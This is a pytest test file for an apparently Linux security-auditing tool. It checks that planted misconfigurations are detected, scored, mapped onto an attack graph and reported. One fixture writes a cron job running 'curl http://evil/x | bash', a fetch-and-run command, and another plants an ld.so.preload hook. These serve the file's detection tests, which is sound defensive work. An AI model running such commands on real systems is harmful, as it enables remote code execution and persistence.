"""End-to-end pipeline tests driven by the deterministic FakeHost.

These assert the whole machine works together: discovery → selection → run →
scoring → every report format → persistence round-trip → resume → diff. They
also assert that the intentional misconfigurations baked into the fake host are
actually caught, which is the real test of the checks.
"""

from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from linux_secbench.checks import CHECK_PACKAGES
from linux_secbench.core.model import Level, Profile, ProfileTarget, Status
from linux_secbench.core.registry import registry
from linux_secbench.core.runner import ScanRunner
from linux_secbench.analysis.risk import RiskScorer
from linux_secbench.persistence import ScanStore
from linux_secbench.reporting import REPORTERS, get_reporter
from linux_secbench.reporting.base import build_bundle
from linux_secbench.system.context import SystemContext
from linux_secbench.system.platform import detect_platform

from linux_secbench.system.executor import CommandResult
from tests.fake_host import FakeHost


@pytest.fixture(scope="module", autouse=True)
def _catalogue():
    if len(registry) == 0:
        registry.autodiscover(list(CHECK_PACKAGES))


def _run_fake_scan(host=None):
    host = host or FakeHost()
    platform = detect_platform(host)
    ctx = SystemContext(host, platform)
    target = ProfileTarget(Profile.SERVER, Level.L2)
    checks = registry.select(target, ctx)
    scorer = RiskScorer()
    runner = ScanRunner(ctx, target, score_fn=scorer.score)
    scan = runner.run(checks, "test-scan-001")
    return scan, ctx


def test_platform_detection_identifies_ubuntu():
    platform = detect_platform(FakeHost())
    assert platform.is_ubuntu
    assert platform.version_id == "24.04"
    assert platform.family == "debian"
    assert platform.cis_supported


def test_scan_produces_results_and_no_unhandled_errors():
    scan, _ = _run_fake_scan()
    assert len(scan.results) > 100
    # No check should crash into ERROR on a well-formed fake host.
    errors = [r for r in scan.results if r.status is Status.ERROR]
    assert not errors, f"checks errored: {[(r.id, r.error) for r in errors]}"
    assert scan.completed


@pytest.mark.parametrize("check_id, expected_status", [
    ("EXT-ACCT-1", Status.FAIL),     # backdoor UID 0
    ("7.2.2", Status.FAIL),          # empty shadow password — CIS v2.0.0 id (was 7.2.1)
    ("EXT-ACCT-3", Status.FAIL),     # svc has a login shell
    ("3.3.1.1", Status.FAIL),        # ip_forward = 1 — CIS v2.0.0 id
    ("2.2.4", Status.FAIL),          # telnet client installed — CIS v2.0.0 id
    ("EXT-NET-2", Status.FAIL),      # mysql exposed
    ("5.1.20", Status.PASS),         # permitrootlogin no — CIS v2.0.0 id (was 5.1.2)
    ("1.5.9", Status.PASS),          # ASLR (kernel.randomize_va_space = 2) — CIS v2.0.0 id
    ("7.1.1", Status.PASS),          # /etc/passwd perms ok
])
def test_known_findings_detected(check_id, expected_status):
    scan, _ = _run_fake_scan()
    by_id = {r.id: r for r in scan.results}
    assert check_id in by_id, f"{check_id} did not run"
    assert by_id[check_id].status is expected_status, \
        f"{check_id}: got {by_id[check_id].status} ({by_id[check_id].summary})"


def test_risk_scoring_orders_critical_first():
    scan, _ = _run_fake_scan()
    scorer = RiskScorer()
    ranked = scorer.ranked_findings(scan.results)
    assert ranked, "expected findings"
    # The top finding should be one of the critical ones (UID 0 / empty pw).
    assert ranked[0].severity.name == "CRITICAL"
    # Scores must be monotonically non-increasing.
    scores = [r.risk_score for r in ranked]
    assert scores == sorted(scores, reverse=True)


def test_posture_grade_reflects_findings():
    scan, _ = _run_fake_scan()
    posture = RiskScorer().posture(scan.results)
    assert 0 <= posture["posture_score"] <= 100
    assert posture["grade"] in {"A", "B", "C", "D", "F"}
    assert posture["critical"] >= 2  # backdoor + empty password


@pytest.mark.parametrize("fmt", sorted(REPORTERS))
def test_every_report_format_renders(fmt):
    scan, _ = _run_fake_scan()
    bundle = build_bundle(scan, generated_at="2026-06-10T00:00:00")
    out = get_reporter(fmt).render(bundle)
    assert isinstance(out, str) and out.strip()
    if fmt == "html":
        assert "<!DOCTYPE html>" in out and "Linux SecBench" in out
    if fmt == "json":
        import json
        json.loads(out)  # must be valid JSON


def test_attacker_targets_prioritize_offensive_value():
    scan, _ = _run_fake_scan()
    from linux_secbench.analysis.attack import attacker_targets
    targets = attacker_targets(scan.results, limit=10)
    assert targets, "expected attacker targets"
    assert len(targets) <= 10

    # Ranks contiguous from 1; values monotonically non-increasing.
    assert [t.rank for t in targets] == list(range(1, len(targets) + 1))
    values = [t.attacker_value for t in targets]
    assert values == sorted(values, reverse=True)

    # The fake host's empty-password (credential access) and UID-0 backdoor
    # (privilege escalation) must surface as top-tier attacker targets.
    keys = {t.tactic_key for t in targets}
    assert "credential_access" in keys
    assert "privilege_escalation" in keys
    assert targets[0].tactic_key in ("credential_access", "privilege_escalation")

    # A purely-cosmetic hardening fail (e.g. a sysctl) must not outrank them:
    # the top target's value should exceed any 'hardening'-tactic target.
    hardening = [t.attacker_value for t in targets if t.tactic_key == "hardening"]
    if hardening:
        assert targets[0].attacker_value > max(hardening)


def test_attack_graph_finds_paths_and_chokepoints():
    scan, _ = _run_fake_scan()
    from linux_secbench.analysis.attack_graph import analyze
    ag = analyze(scan)

    assert ag.root_reachable, "fake host has exploitable sudo/suid/docker — root must be reachable"
    assert ag.paths, "expected at least one attacker→root path"

    # Every path must start at the attacker and end at root.
    for p in ag.paths:
        assert p.nodes[0] == "attacker"
        assert p.nodes[-1] == "root"

    # The exploitable-sudo and docker-group findings must appear as escalation
    # steps somewhere in the graph.
    techniques = " ".join(e.technique for p in ag.paths for e in p.edges).lower()
    assert "sudo" in techniques
    assert "docker" in techniques or "group" in techniques

    # Chokepoints are the min-cut: fixing them must cut root off. They should be
    # the privesc findings, deduped by finding id.
    choke_ids = {e.finding_id for e in ag.chokepoints}
    assert "EXT-PRIV-1" in choke_ids  # exploitable sudo
    # Fixing all chokepoints should make root unreachable — verify by removing
    # those findings and re-analysing.
    from linux_secbench.core.model import Status
    survivors = [r for r in scan.results if r.id not in choke_ids]
    scan.results = survivors
    ag2 = analyze(scan)
    assert not ag2.root_reachable, "removing chokepoint findings should sever all paths to root"


def test_two_lens_split_and_compromise_estimate():
    scan, _ = _run_fake_scan()
    from linux_secbench.reporting.base import build_bundle
    bundle = build_bundle(scan, generated_at="2026-06-10T00:00:00")
    # Foothold lens holds only genuine *initial access*; credential access is a
    # post-foothold capability and belongs to the escalation lens.
    assert all(t.tactic_key == "initial_access" for t in bundle.foothold_targets)
    assert all(t.tactic_key != "initial_access" for t in bundle.escalation_targets)
    c = bundle.compromise
    for p in (c.foothold, c.escalation, c.overall):
        assert 0.0 <= p <= 1.0
    # This deliberately-broken host should look very compromisable.
    assert c.escalation > 0.5


def _synthetic_scan(results):
    from linux_secbench.core.model import ScanResult
    target = ProfileTarget(Profile.SERVER, Level.L2)
    return ScanResult(scan_id="syn", host="h1", target=target,
                      started_at="2026-06-10T00:00:00", results=results, completed=True)


def _finding(cid, tags, severity, *, actual=None):
    from linux_secbench.core.model import CheckMetadata, CheckResult, Status
    return CheckResult(
        metadata=CheckMetadata(id=cid, title=cid, section="s", severity=severity, tags=tuple(tags)),
        status=Status.FAIL, actual=actual)


def test_local_credentials_are_not_an_external_foothold():
    """World-readable keys (local credential access) must not fabricate an
    attacker->local entry edge or inflate the 'chance an attacker can get in'."""
    from linux_secbench.core.model import Severity
    from linux_secbench.analysis.attack_graph import build_attack_graph, ATTACKER, LOCAL, ROOT
    from linux_secbench.analysis.bayes import compromise_estimate
    # Only local findings: a world-readable private key (EXT-CRED-2 shape) plus a
    # local privesc edge to root.
    key = _finding("EXT-CRED-2", ("credentials", "ssh", "keys"), Severity.HIGH)
    privesc = _finding("EXT-PRIV-X", ("privilege", "suid"), Severity.HIGH,
                       actual={"vectors": [{"src": LOCAL, "dst": ROOT, "technique": "sudo python"}]})
    scan = _synthetic_scan([key, privesc])

    graph = build_attack_graph(scan)
    # No *real* attacker->local edge — only the labeled assumed-foothold one.
    real_entry = [e for e in graph.edges if e.src == ATTACKER and e.dst == LOCAL and not e.assumed]
    assert not real_entry, "world-readable keys must not create an external entry edge"
    assert graph.assumed_foothold is True

    est = compromise_estimate(scan)
    assert est.foothold_drivers == 0 and est.foothold_assumed is True

    bundle = build_bundle(scan, generated_at="2026-06-10T00:00:00")
    foot_ids = {t.check_id for t in bundle.foothold_targets}
    esc_ids = {t.check_id for t in bundle.escalation_targets}
    assert "EXT-CRED-2" not in foot_ids
    assert "EXT-CRED-2" in esc_ids   # credential access -> escalation lens


def test_network_exposed_service_is_a_real_foothold():
    """A sensitive service exposed on a non-loopback socket is genuine entry."""
    from linux_secbench.core.model import Severity
    from linux_secbench.analysis.attack_graph import build_attack_graph, ATTACKER, LOCAL
    from linux_secbench.analysis.bayes import compromise_estimate
    net = _finding("EXT-NET-2", ("network", "exposure", "database"), Severity.HIGH)
    scan = _synthetic_scan([net])
    graph = build_attack_graph(scan)
    real_entry = [e for e in graph.edges if e.src == ATTACKER and e.dst == LOCAL and not e.assumed]
    assert real_entry and graph.assumed_foothold is False
    est = compromise_estimate(scan)
    assert est.foothold_drivers >= 1 and est.foothold_assumed is False


def test_installed_cleartext_client_is_not_initial_access():
    """An installed telnet client is hygiene, not a network entry vector."""
    from linux_secbench.core.model import Severity
    from linux_secbench.analysis.attack import _classify
    from linux_secbench.analysis.attack_graph import build_attack_graph, ATTACKER, LOCAL
    client = _finding("2.3.4", ("services", "cleartext", "client"), Severity.HIGH)
    assert _classify(client).key != "initial_access"
    graph = build_attack_graph(_synthetic_scan([client]))
    assert not [e for e in graph.edges if e.src == ATTACKER and e.dst == LOCAL and not e.assumed]


def test_surface_hardening_is_not_a_demonstrated_entry_vector():
    """Missing firewall / SSH-hardening / lockout policy reduce exposure but are
    not a demonstrated way in — they must not drive the 'chance to get in' %."""
    from linux_secbench.core.model import Severity
    from linux_secbench.analysis.bayes import compromise_estimate
    fw = _finding("4.1.1", ("firewall", "default-deny"), Severity.HIGH)
    sshd = _finding("5.1.2", ("ssh",), Severity.MEDIUM)
    est = compromise_estimate(_synthetic_scan([fw, sshd]))
    assert est.foothold_drivers == 0 and est.foothold_assumed is True


def test_foothold_lens_is_honest_when_no_entry_vector():
    """Reporters state 'no external entry vector' instead of a misleading 0%."""
    from linux_secbench.core.model import Severity
    from linux_secbench.analysis.attack_graph import LOCAL, ROOT
    key = _finding("EXT-CRED-2", ("credentials", "keys"), Severity.HIGH)
    privesc = _finding("EXT-PRIV-X", ("privilege",), Severity.HIGH,
                       actual={"vectors": [{"src": LOCAL, "dst": ROOT, "technique": "x"}]})
    bundle = build_bundle(_synthetic_scan([key, privesc]), generated_at="2026-06-10T00:00:00")
    for fmt in ("terminal", "markdown", "html"):
        text = get_reporter(fmt).render(bundle)
        assert "No externally-reachable entry weakness" in text
        assert "can get in: 0%" not in text and "host: 0%" not in text


def test_kiosk_checks_are_opt_in():
    from linux_secbench.core.model import Status
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.WORKSTATION, Level.L2)
    default = registry.select(target, ctx)
    assert not any(c.metadata.framework == "Kiosk" for c in default), "kiosk must be off by default"
    withk = registry.select(target, ctx, include_kiosk=True)
    kiosk = [c for c in withk if c.metadata.framework == "Kiosk"]
    assert kiosk, "kiosk checks should appear with include_kiosk=True"
    # And they must run without crashing.
    scan = ScanRunner(ctx, target).run(kiosk, "kiosk")
    assert not [r for r in scan.results if r.status is Status.ERROR]


def test_history_scan_covers_non_home_users():
    scan, _ = _run_fake_scan()
    by_id = {r.id: r for r in scan.results}
    res = by_id["EXT-CRED-3"]
    assert res.status is Status.FAIL, f"expected leaked history to be caught: {res.summary}"
    # The leak lives in /opt/svc (a non-/home service account home).
    assert any("/opt/svc/.bash_history" in e for e in res.evidence)


def test_home_dirs_excludes_root_slash_and_junk():
    from linux_secbench.checks.extended.credentials import _home_dirs
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    host = FakeHost()
    # A malformed account whose home is "/" must never become a search root.
    host.files["/etc/passwd"] += "danger:x:1234:1234:bad:/:/bin/bash\n"
    ctx = SystemContext(host, detect_platform(host))
    homes = _home_dirs(ctx)
    assert "/" not in homes
    assert "/nonexistent" not in homes
    assert "/root" in homes  # always included


def test_output_flag_writes_all_formats(tmp_path):
    from linux_secbench import cli
    outdir = tmp_path / "out"
    rc = cli.main(["--store", str(tmp_path / "store"), "scan",
                   "--ids", "1.5.1", "--no-extended", "-o", str(outdir),
                   "--quiet", "--no-color"])
    assert rc in (0, 1)  # exit code reflects findings; both acceptable
    # -o with no --format now writes every shareable format, auto-named.
    for ext in ("html", "json", "csv", "md"):
        assert list(outdir.glob(f"secbench-*.{ext}")), f"-o must produce a .{ext} report"


def test_output_flag_format_narrows(tmp_path):
    from linux_secbench import cli
    outdir = tmp_path / "out"
    cli.main(["--store", str(tmp_path / "store"), "scan", "--ids", "1.5.1",
              "--no-extended", "-o", str(outdir), "--format", "json", "--quiet", "--no-color"])
    assert list(outdir.glob("secbench-*.json"))
    assert not list(outdir.glob("secbench-*.html")), "--format must narrow the written set"


def test_no_output_flag_writes_nothing(tmp_path, monkeypatch):
    from linux_secbench import cli
    monkeypatch.chdir(tmp_path)
    cli.main(["--store", str(tmp_path / "store"), "scan",
              "--ids", "1.5.1", "--no-extended", "--quiet", "--no-color"])
    assert not list(tmp_path.glob("secbench-*")), "no -o / no file --format → no files"


def test_clean_removes_only_the_store(tmp_path):
    from linux_secbench import cli
    store = str(tmp_path / "store")
    outdir = tmp_path / "out"
    cli.main(["--store", store, "scan", "--ids", "1.5.1", "--no-extended",
              "-o", str(outdir), "--quiet", "--no-color"])
    assert os.path.isdir(store)
    report = list(outdir.glob("secbench-*.html"))
    assert report

    # Dry run keeps everything.
    cli.main(["--store", store, "clean", "--dry-run", "--no-color"])
    assert os.path.isdir(store)

    # --yes removes the store but leaves the -o report untouched.
    rc = cli.main(["--store", store, "clean", "--yes", "--no-color"])
    assert rc == 0
    assert not os.path.isdir(store)
    assert report[0].exists(), "clean must never delete report files in -o"

    # Cleaning a missing store is a clean no-op.
    assert cli.main(["--store", store, "clean", "--yes"]) == 0


def test_secret_values_redacted_by_default():
    scan, _ = _run_fake_scan()
    res = {r.id: r for r in scan.results}["EXT-CRED-1"]
    assert res.status is Status.FAIL
    joined = " ".join(res.evidence)
    assert "chars)" in joined                                   # a redacted preview is shown
    assert "aZ3kP9xQ2mL7vB4nR8wT1yU6QwErTy" not in joined       # full secret is NOT in the report


def test_secret_values_revealed_with_flag():
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    host = FakeHost()
    ctx = SystemContext(host, detect_platform(host))
    ctx.reveal_secrets = True
    target = ProfileTarget(Profile.SERVER, Level.L2)
    scan = ScanRunner(ctx, target).run(registry.select(target, ctx), "reveal")
    res = {r.id: r for r in scan.results}["EXT-CRED-1"]
    assert any("aZ3kP9xQ2mL7vB4nR8wT1yU6QwErTy" in e for e in res.evidence)


def test_html_has_drilldown_sort_and_gtfobins_link():
    import html.parser as _hp
    from linux_secbench.reporting.base import build_bundle
    from linux_secbench.reporting import get_reporter
    scan, _ = _run_fake_scan()
    doc = get_reporter("html").render(build_bundle(scan, generated_at="2026-06-10T00:00:00"))
    assert "atk-detail" in doc                 # expandable attacker rows
    assert "id='finding-" in doc               # finding anchors to jump to
    assert "findings-table" in doc and "sortBy" in doc  # sortable table + script
    assert "gtfobins.github.io" in doc         # per-binary technique link
    _hp.HTMLParser().feed(doc)                 # still well-formed


def _run_kiosk(host):
    from linux_secbench.system.platform import detect_platform
    from linux_secbench.system.context import SystemContext
    ctx = SystemContext(host, detect_platform(host))
    target = ProfileTarget(Profile.WORKSTATION, Level.L2)
    checks = [c for c in registry.select(target, ctx, include_kiosk=True)
              if c.metadata.framework == "Kiosk"]
    scan = ScanRunner(ctx, target).run(checks, "kiosk")
    return {r.id: r for r in scan.results}


def test_kiosk_expanded_and_no_errors():
    from linux_secbench.core.model import Status
    kiosk_ids = [c.id for c in registry if c.metadata.framework == "Kiosk"]
    assert len(kiosk_ids) >= 50, "expected the expanded kiosk catalogue (~50+)"
    results = _run_kiosk(FakeHost())
    assert not [r for r in results.values() if r.status is Status.ERROR]


def test_kiosk_full_de_warns_minimal_passes():
    de = FakeHost(); de.processes = {"gnome-shell"}
    assert _run_kiosk(de)["KIOSK-9"].status is Status.WARN
    kiosk = FakeHost(); kiosk.processes = {"cage"}
    assert _run_kiosk(kiosk)["KIOSK-9"].status is Status.PASS


def test_kiosk_browser_devtools_policy():
    # Managed policy present but DevTools not disabled → fail.
    bad = FakeHost()
    bad.files["/etc/opt/chrome/policies/managed/kiosk.json"] = '{"URLBlocklist": ["*"]}'
    assert _run_kiosk(bad)["KIOSK-42"].status is Status.FAIL
    # DevTools disabled → pass.
    good = FakeHost()
    good.files["/etc/opt/chrome/policies/managed/kiosk.json"] = '{"DeveloperToolsAvailability": 2}'
    assert _run_kiosk(good)["KIOSK-42"].status is Status.PASS


def test_kiosk_sysrq_flagged():
    h = FakeHost(); h.sysctls["kernel.sysrq"] = "1"
    assert _run_kiosk(h)["KIOSK-49"].status is Status.WARN


def test_attack_ids_mapping_and_metadata_roundtrip():
    from linux_secbench.analysis.attack import attack_ids
    from linux_secbench.core.model import CheckMetadata, CheckResult, Severity, Status
    derived = CheckResult(metadata=CheckMetadata(id="X", title="t", section="s",
                                                 severity=Severity.HIGH, tags=("suid",)),
                          status=Status.FAIL)
    assert "T1548.001" in attack_ids(derived)            # tag-derived
    explicit = CheckResult(metadata=CheckMetadata(id="Y", title="t", section="s",
                                                  tags=("suid",), attack=("T9999",)),
                           status=Status.FAIL)
    assert attack_ids(explicit) == ("T9999",)            # explicit overrides tags
    rt = CheckResult.from_dict(explicit.to_dict())        # round-trips through json
    assert rt.metadata.attack == ("T9999",)


def test_avahi_not_foothold_and_mount_excluded():
    scan, _ = _run_fake_scan()
    from linux_secbench.analysis.attack_graph import analyze
    ag = analyze(scan)
    entry = " ".join(e.technique for p in ag.paths for e in p.edges if e.src == "attacker").lower()
    assert "avahi" not in entry and "mdns" not in entry   # service presence is not a foothold
    ev = " ".join({r.id: r for r in scan.results}["EXT-PRIV-2"].evidence)
    assert "/usr/bin/find" in ev          # unexpected setuid IS flagged
    assert "/usr/bin/sudo" not in ev      # default-setuid excluded (no false positive)


def test_suppression_overlay_and_cli(tmp_path):
    import os
    from linux_secbench import cli
    from linux_secbench.persistence import SuppressionStore
    from linux_secbench.reporting.base import build_bundle
    store = str(tmp_path / "store")
    # --all-hosts records a global suppression (matches any host's finding).
    assert cli.main(["--store", store, "suppress", "EXT-PRIV-2", "--all-hosts", "--reason", "reviewed"]) == 0
    assert cli.main(["--store", store, "suppressions"]) == 0
    sp = SuppressionStore(os.path.join(store, "suppressions.json"))
    assert sp.match("EXT-PRIV-2", "anyhost") is not None
    scan, _ = _run_fake_scan()
    b = build_bundle(scan, generated_at="x", suppressions=sp)
    assert any(r.id == "EXT-PRIV-2" for r in b.suppressed)
    assert not any(r.id == "EXT-PRIV-2" for r in b.ranked)   # left the work-list / score
    assert cli.main(["--store", store, "unsuppress", "EXT-PRIV-2"]) == 0
    assert SuppressionStore(os.path.join(store, "suppressions.json")).match("EXT-PRIV-2", "h") is None


def test_suppression_is_host_scoped_by_default(tmp_path):
    import os
    from linux_secbench import cli
    from linux_secbench.persistence import SuppressionStore
    from linux_secbench.reporting.base import build_bundle
    from linux_secbench.system.executor import LocalExecutor
    store = str(tmp_path / "store")
    # A bare `suppress` scopes to THIS host — an FP here may be real elsewhere.
    assert cli.main(["--store", store, "suppress", "EXT-PRIV-2", "--reason", "r"]) == 0
    sp = SuppressionStore(os.path.join(store, "suppressions.json"))
    this_host = LocalExecutor().host
    assert sp.all()[0].host == this_host and this_host != "*"
    assert sp.match("EXT-PRIV-2", this_host) is not None
    assert sp.match("EXT-PRIV-2", "some-other-host") is None       # no cross-host bleed
    # The fake-host scan (host 'fake01') is therefore unaffected.
    scan, _ = _run_fake_scan()
    b = build_bundle(scan, generated_at="x", suppressions=sp)
    assert any(r.id == "EXT-PRIV-2" for r in b.ranked)
    assert not any(r.id == "EXT-PRIV-2" for r in b.suppressed)
    # Scoping explicitly to the scan's host does suppress it.
    assert cli.main(["--store", store, "suppress", "EXT-PRIV-2", "--host", "fake01"]) == 0
    b2 = build_bundle(scan, generated_at="x",
                      suppressions=SuppressionStore(os.path.join(store, "suppressions.json")))
    assert any(r.id == "EXT-PRIV-2" for r in b2.suppressed)


def test_suppression_matches_is_host_specific():
    from linux_secbench.persistence.suppressions import Suppression
    assert Suppression(check_id="X", host="db01").matches("X", "db01")
    assert not Suppression(check_id="X", host="db01").matches("X", "db02")
    assert Suppression(check_id="X", host="*").matches("X", "db02")


def test_serve_suppress_honours_host_including_file_mode(tmp_path, monkeypatch):
    """The live /suppress path defaults to the served scan's host and honours an
    explicit '*' — identically for store mode and `serve -f` (file mode)."""
    from linux_secbench import cli
    from linux_secbench.reporting import serve as serve_mod
    from linux_secbench.persistence import SuppressionStore
    saved = ScanStore(str(tmp_path / "src")).save(_run_fake_scan()[0])   # host 'fake01'

    def fake_run(render_html, suppress, unsuppress, bind, port, export=None):
        suppress("EXT-PRIV-2", "false-positive", "via ui", None)        # default → scan host
        suppress("EXT-CRED-2", "false-positive", "everywhere", "*")     # all hosts

    monkeypatch.setattr(serve_mod, "run", fake_run)
    assert cli.main(["--store", str(tmp_path / "absent"), "serve", "-f", saved]) == 0
    sib = SuppressionStore(saved + ".suppressions.json")               # file-mode sibling
    m1, m2 = sib.match("EXT-PRIV-2", "fake01"), sib.match("EXT-CRED-2", "anyhost")
    assert m1 and m1.host == "fake01"
    assert m2 and m2.host == "*"
    assert sib.match("EXT-PRIV-2", "other-host") is None               # default didn't go global


def test_html_dynamic_and_suppressed_sections():
    import os, tempfile
    from linux_secbench.persistence import SuppressionStore
    from linux_secbench.reporting.base import build_bundle
    from linux_secbench.reporting import get_reporter
    scan, _ = _run_fake_scan()
    sp = SuppressionStore(os.path.join(tempfile.mkdtemp(), "s.json"))
    sp.add("EXT-PRIV-2", reason="reviewed")
    b = build_bundle(scan, generated_at="x", suppressions=sp)
    doc = get_reporter("html").render(b)
    assert "window.SECBENCH" in doc and "secbenchScope" in doc and "class='fpbox'" in doc
    assert "ATT&CK" in doc
    term = get_reporter("terminal").render(b)
    assert "SUPPRESSED" in term and "EXT-PRIV-2" in term


def test_serve_refuses_nonloopback(tmp_path):
    from linux_secbench import cli
    assert cli.main(["--store", str(tmp_path / "store"), "serve", "--bind", "0.0.0.0"]) == 2


def test_cusum_detects_sustained_drop():
    from linux_secbench.analysis.statistics import cusum
    steady = [90, 91, 89, 90, 90, 91, 89]
    assert cusum(steady) == []                      # no shift
    dropped = [90, 91, 90, 89, 90, 70, 68, 69, 67]  # sustained drop at index 5+
    signals = cusum(dropped)
    assert signals, "CUSUM should flag the sustained downward shift"
    assert min(signals) >= 4


def test_persistence_round_trip_and_resume(tmp_path):
    store = ScanStore(str(tmp_path))
    scan, ctx = _run_fake_scan()
    path = store.save(scan)
    assert os.path.isfile(path)

    loaded = store.load(scan.host, scan.scan_id)
    assert loaded is not None
    assert loaded.compliance_score() == pytest.approx(scan.compliance_score())
    assert len(loaded.results) == len(scan.results)

    # Simulate an interrupted scan and verify resume skips completed checks.
    partial = scan
    partial.completed = False
    partial.results = partial.results[:20]
    store.save(partial)
    resumable = store.find_resumable(ctx.host, partial.target)
    assert resumable is not None and len(resumable.completed_ids()) == 20


def test_diff_detects_fix_and_regression(tmp_path):
    store = ScanStore(str(tmp_path))
    scan_old, _ = _run_fake_scan()
    scan_old.scan_id = "old"
    store.save(scan_old)

    # New scan where the IP-forward issue is fixed.
    host2 = FakeHost()
    host2.sysctls["net.ipv4.ip_forward"] = "0"
    scan_new, _ = _run_fake_scan(host2)
    scan_new.scan_id = "new"
    store.save(scan_new)

    old = store.load(scan_old.host, "old")
    new = store.load(scan_new.host, "new")
    old_status = {r.id: r.status for r in old.results}
    new_status = {r.id: r.status for r in new.results}
    # 3.3.1.1 (ip_forward) should have flipped FAIL → PASS.
    assert old_status["3.3.1.1"] is Status.FAIL
    assert new_status["3.3.1.1"] is Status.PASS


def test_non_root_marks_sensitive_checks_manual():
    host = FakeHost(is_root=False)
    scan, _ = _run_fake_scan(host)
    by_id = {r.id: r for r in scan.results}
    # Empty-shadow-password check needs root; without it, it must not FAIL/crash.
    assert by_id["7.2.2"].status in (Status.MANUAL, Status.SKIP)


# --------------------------------------------------------------------------- #
# Expanded security checks (Areas A–F): the two reported gaps + representative
# positives for the headline checks. Each uses a purpose-built host so the
# assertion is unambiguous.
# --------------------------------------------------------------------------- #

def test_rdp_pass_password_file_is_caught():
    # The exact miss the user reported: a credential file named for what it
    # holds, no recognised extension, not on any allowlist. The default host
    # already plants /opt/rdp/.rdp_pass; EXT-CRED-6 must flag it by name+content.
    scan, _ = _run_fake_scan()
    res = {r.id: r for r in scan.results}["EXT-CRED-6"]
    assert res.status is Status.FAIL, res.summary
    assert any("/opt/rdp/.rdp_pass" in e for e in res.evidence)
    # The plaintext password must NOT leak into the report (redacted by default).
    assert "R3m0teD3skt0p!secret" not in " ".join(res.evidence)


def test_process_cmdline_secret_is_caught():
    # The `ps aux` half: a daemon launched with a password on its command line.
    host = FakeHost()
    host.procs["4242"] = {"cmdline": "mysqld --user=root --password=hunter2longpass",
                          "environ": "", "comm": "mysqld"}
    scan, _ = _run_fake_scan(host)
    res = {r.id: r for r in scan.results}["EXT-CRED-7"]
    assert res.status is Status.FAIL, res.summary
    assert any("4242" in e for e in res.evidence)
    assert "hunter2longpass" not in " ".join(res.evidence)   # redacted by default


def test_process_environ_secret_still_caught():
    # EXT-CRED-4 (the environ half) must keep working with the proc fixtures.
    host = FakeHost()
    host.procs["909"] = {"cmdline": "app", "comm": "app",
                         "environ": "PATH=/usr/bin\nSECRET=sk9aZ2kP7xQ4mL1vB8nR3wT6yU0\n"}
    scan, _ = _run_fake_scan(host)
    res = {r.id: r for r in scan.results}["EXT-CRED-4"]
    assert res.status is Status.FAIL, res.summary


@pytest.mark.parametrize("setup, check_id, expected", [
    # Area B — privilege escalation
    (lambda h: h.files.__setitem__("/etc/environment", 'PATH="/usr/bin:/opt/tools:."\n')
        or h.stat.__setitem__("/opt/tools", "777 1000 1000 alice alice directory"),
     "EXT-PRIV-6", Status.FAIL),
    (lambda h: h.files.__setitem__("/etc/ld.so.preload", "/opt/evil/hook.so\n"),
     "EXT-PRIV-7", Status.FAIL),
    (lambda h: h.files.__setitem__("/etc/exports", "/srv 10.0.0.0/24(rw,no_root_squash)\n"),
     "EXT-PRIV-10", Status.FAIL),
    (lambda h: h.stat.__setitem__("/etc/passwd", "666 0 0 root root regular file"),
     "EXT-PRIV-13", Status.FAIL),
    (lambda h: h.stat.__setitem__("/run/docker.sock", "666 0 0 root root socket"),
     "EXT-PRIV-14", Status.FAIL),
    # Area C — persistence
    (lambda h: h.files.__setitem__("/etc/cron.d/backup",
                                   "*/5 * * * * root curl http://evil/x | bash\n"),
     "EXT-PERS-1", Status.FAIL),
    # Area D — kernel hardening
    (lambda h: h.sysctls.__setitem__("kernel.randomize_va_space", "0"),
     "EXT-HARD-1", Status.FAIL),
    (lambda h: h.sysctls.__setitem__("kernel.yama.ptrace_scope", "0"),
     "EXT-HARD-2", Status.FAIL),
    # Area F — posture
    (lambda h: h.command_map.__setitem__(
        "aa-status",
        CommandResult(["aa-status"], 0,
                      "apparmor module is loaded.\n3 profiles are loaded.\n"
                      "0 profiles are in enforce mode.\n3 profiles are in complain mode.\n")),
     "EXT-MON-1", Status.WARN),
])
def test_expanded_check_positives(setup, check_id, expected):
    host = FakeHost()
    setup(host)
    scan, _ = _run_fake_scan(host)
    res = {r.id: r for r in scan.results}[check_id]
    assert res.status is expected, f"{check_id}: {res.status} ({res.summary})"


def test_account_hygiene_positives():
    # Duplicate UID 0 (root + the planted backdoor) and the empty-password guest
    # account are caught by the new account-hygiene checks.
    scan, _ = _run_fake_scan()
    by_id = {r.id: r for r in scan.results}
    assert by_id["EXT-ACCT-8"].status is Status.FAIL    # duplicate UID 0
    assert by_id["EXT-ACCT-9"].status is Status.FAIL    # empty password (guest)
    assert any("UID 0" in e for e in by_id["EXT-ACCT-8"].evidence)


def test_load_path_reads_standalone_scan(tmp_path):
    store = ScanStore(str(tmp_path / "store"))
    scan, _ = _run_fake_scan()
    saved = store.save(scan)
    loaded = store.load_path(saved)
    assert loaded is not None and loaded.host == scan.host
    assert store.load_path(str(tmp_path / "missing.json")) is None
    junk = tmp_path / "junk.json"
    junk.write_text('{"not": "a scan"}')
    assert store.load_path(str(junk)) is None


def test_load_path_accepts_a_rendered_json_report(tmp_path):
    """A user who grabs the `-o` / `report --format json` file (a report *bundle*,
    which nests the record under "scan") must be able to review it off-box."""
    store = ScanStore(str(tmp_path / "store"))
    scan, _ = _run_fake_scan()
    bundle = build_bundle(scan, generated_at="2026-06-10T00:00:00")
    report_json = tmp_path / "secbench-host-id.json"
    report_json.write_text(get_reporter("json").render(bundle))
    # Sanity: this file is the bundle shape (no top-level scan_id; nested "scan").
    import json as _json
    raw = _json.loads(report_json.read_text())
    assert "scan_id" not in raw and isinstance(raw.get("scan"), dict)
    loaded = store.load_path(str(report_json))
    assert loaded is not None
    assert loaded.host == scan.host and loaded.scan_id == scan.scan_id
    assert len(loaded.results) == len(scan.results)


def test_report_from_standalone_file_without_store(tmp_path, capsys):
    import json as _json
    from linux_secbench import cli
    # Produce a scan file via one store, then "move" it somewhere unrelated.
    src_store = ScanStore(str(tmp_path / "src"))
    scan, _ = _run_fake_scan()
    saved = src_store.save(scan)
    moved = tmp_path / "carried-off" / "db01-scan.json"
    moved.parent.mkdir(parents=True)
    moved.write_text(open(saved).read())

    # Review on a "different machine": a store dir that does not (and must not) exist.
